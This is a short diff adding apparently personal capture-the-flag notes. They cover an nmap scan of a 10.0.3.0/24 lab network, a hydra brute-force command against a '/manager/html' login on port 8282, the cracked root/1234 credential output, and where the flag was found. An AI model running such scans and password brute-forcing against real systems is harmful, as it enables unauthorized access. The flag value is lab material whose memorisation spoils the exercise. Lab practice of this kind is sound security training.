@@ -1,0 +1,18 @@
+flag 90b353
+
+inspect network for http as i need to go to hacker manifesto
+nmap 10.0.3.0/24
+
+command to check user passwords as clicking on the manager app asks for
+username and password
+[8282][http-get] host: 10.0.3.197   login: root   password: 1234
+ this is the password match
+
+and hydra command to check the passwords
+
+hydra -L usernames.txt -P passwords.txt 10.0.3.197 -s 8282 http-get /manager/html -t 4 -V
+
+and inspect the pages and under one of the link, the image source was the
+flag
+
+
